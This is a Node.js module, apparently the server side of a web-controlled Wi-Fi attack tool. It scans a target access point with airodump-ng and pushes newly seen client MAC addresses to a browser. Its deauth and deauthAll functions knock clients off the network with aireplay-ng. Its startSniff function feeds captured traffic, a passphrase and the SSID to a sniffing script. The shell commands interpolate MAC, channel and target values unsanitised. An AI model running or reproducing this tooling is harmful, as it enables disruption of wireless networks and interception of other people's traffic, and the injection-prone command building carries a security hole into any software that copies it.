const { exec, spawn, execSync } = require('child_process');
const process = require('process'); 

const xml2js = require('xml2js');
const fs = require('fs');
const path = require('path');


const WIFI_SCAN_OUTPUT_DIR = path.join('/tmp', 'ngcrack_output');
const WIFI_SCAN_FILE_PREFIX = 'clients';
let io;
let ssid = '';
let mac = '';
let channel = '';
let lastKnownClients = new Set();

function init(i, s, m, c) {
	ssid = s;
	mac = m;
	channel = c;
	cleanup();
    io = i;
	const command = `cd /tmp/ngcrack_output && airodump-ng --bssid ${mac} -c ${channel} -w clients wlan1mon >> /dev/null`;

    airodumpProcess = spawn(command, {
        shell: true
    });

	setTimeout(monitorLatestScanFile, 2000);
}

function cleanup() {
	try {
		execSync("pkill -9 -f airodump-ng");
	} catch (error) {}
	
	lastKnownClients = new Set();
}


function tryFixCapFile(originalFile, outputFile) {
  const cmd = `editcap -F pcap "${originalFile}" "/var/www/kozone/python/${outputFile}" 2>&1`;
  try {
    let m = execSync(cmd);
	if (m.toString().includes('editcap: The file'))
		return false;
    return true; // Return true on success
  } catch (error) {
    return false; // Return false on failure
  }
}

function startSniff(io, pass, ssid) {
	// Define the command
	process.chdir('/var/www/kozone/python');

	exec(`pkill -f -9 sniff.py`);
	exec('echo /var/www/kozone/python/last_packet.txt > 0');

	let tmpFile = 'tmp.cap';
	let success = false;
	let attempts = 0;
	const maxAttempts = 5; // Set a limit on attempts to avoid an infinite loop

	while (!success && attempts < maxAttempts) {
	  let capFile = getLatestCapFile(); // Ensure this function returns the path to the latest .cap file

	  attempts++;
	  success = tryFixCapFile(capFile, tmpFile);

	  if (!success) {
		execSync('sleep 1');
	  }
	}
	
	//cmd = `cd /var/www/kozone/python && python sniff.py tmp.cap ${pass} "${ssid}" >> sniff_output.txt`
	//console.log(11, capFile, cmd)
	//exec(cmd);
	

	cmd = 'python';
	const args = ['sniff.py', 'tmp.cap', pass, ssid];

	// Execute the command
	const p = spawn(cmd, args);

	// Process the output line by line
	p.stdout.on('data', (data) => {
		const lines = data.toString().split('\n');
		lines.forEach((line) => {
			// Process each line as needed
			if (line.trim().length == 0)
				return;
			
			if (line.trim() == 'f f f') {
				setTimeout(() => {
					startSniff(io, pass, ssid);
				}, 1000);
				
				return;
			}
			
			io.emit('cap', line.trim());
			console.log('>>', line.trim());
		});
	});
	
	// Handle errors
	p.stderr.on('data', (data) => {
		console.error(`Error: ${data}`);
	});

	
	
	
	
}

function getLatestScanFile() {
  const files = fs.readdirSync(WIFI_SCAN_OUTPUT_DIR);
  const csvFiles = files
    .filter(file => file.startsWith(WIFI_SCAN_FILE_PREFIX) && file.endsWith('.csv') && !file.endsWith('kismet.csv'))
    .map(file => ({
      file,
      time: fs.statSync(path.join(WIFI_SCAN_OUTPUT_DIR, file)).mtime.getTime()
    }))
    .sort((a, b) => b.time - a.time);

  return csvFiles.length > 0 ? path.join(WIFI_SCAN_OUTPUT_DIR, csvFiles[0].file) : null;
}

function getLatestCapFile() {
  const files = fs.readdirSync(WIFI_SCAN_OUTPUT_DIR);
  const csvFiles = files
    .filter(file => file.startsWith(WIFI_SCAN_FILE_PREFIX) && file.endsWith('.cap'))
    .map(file => ({
      file,
      time: fs.statSync(path.join(WIFI_SCAN_OUTPUT_DIR, file)).mtime.getTime()
    }))
    .sort((a, b) => b.time - a.time);

  return csvFiles.length > 0 ? path.join(WIFI_SCAN_OUTPUT_DIR, csvFiles[0].file) : null;
}

function parseClientsFromCSV(filePath) {
  // Read the CSV file and parse clients
  const content = fs.readFileSync(filePath, 'utf8');
  const lines = content.split('\n');
  const clients = new Set();

  // Assuming the MAC addresses of clients are in the first column
  lines.forEach(line => {
    const columns = line.split(',');
    const mac = columns[0].trim();
    if (mac.match(/^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$/)) {
      clients.add(mac);
    }
  });

  return clients;
}

function monitorLatestScanFile() {
  const latestFile = getLatestScanFile();
  if (!latestFile) return;

  // Initial load of existing clients
  if (lastKnownClients.size === 0) {
    lastKnownClients = parseClientsFromCSV(latestFile);
	
	lastKnownClients.forEach((clientMac) => {
		io.emit('newClient', clientMac);
	});
  }

  fs.watch(latestFile, (eventType, filename) => {
    if (eventType === 'change') {
      const currentClients = parseClientsFromCSV(latestFile);
      const newClients = new Set([...currentClients].filter(x => !lastKnownClients.has(x)));

      if (newClients.size > 0) {
		  
		newClients.forEach((clientMac) => {
			io.emit('newClient', clientMac);
		});
        lastKnownClients = new Set([...lastKnownClients, ...newClients]);
      }
    }
  });
}

function deauthAll(i, ssid, mac, channel) {
	execSync(`iwconfig wlan1mon channel ${channel}`);
	const command = `aireplay-ng --deauth 10 -a ${mac} wlan1mon`;
	exec(command, (error, stdout, stderr) => {
	  if (error) {
		return;
	  }
	});
	console.log(command);

}

function deauth(i, ssid, mac, channel, target) {
	/*
	
		// Path to your .netxml file
const filePath = '/tmp/ngcrack_output/clients-30.kismet.netxml';

// Read the .netxml file content
fs.readFile(filePath, (err, data) => {
  if (err) {
    console.error('Error reading the file:', err);
    return;
  }

  // Parse the XML data
  xml2js.parseString(data, (err, result) => {
    if (err) {
      console.error('Error parsing XML:', err);
      return;
    }

	console.log(result['detection-run']['wireless-network'][0]['manuf']);


	console.log(result['detection-run']['wireless-network'][0]['wireless-client']);
	
	console.log(result['detection-run']['wireless-network'][0]['wireless-client'][0]['packets']);
	
	console.log(result['detection-run']['wireless-network'][0]['wireless-client'][0]['snr-info']);

  });
});
	
	*/
	
	
	
	
	
	
	
	
	
	
	
	
	execSync(`iwconfig wlan1mon channel ${channel}`);
	const command = `aireplay-ng --deauth 10 -a ${mac} -c ${target} wlan1mon`;
	exec(command, (error, stdout, stderr) => {
	  if (error) {
		return;
	  }
	});
	
	console.log("Deauth", mac, target);
}



module.exports = {
  init,
  cleanup,
  deauth,
  deauthAll,
  startSniff
};
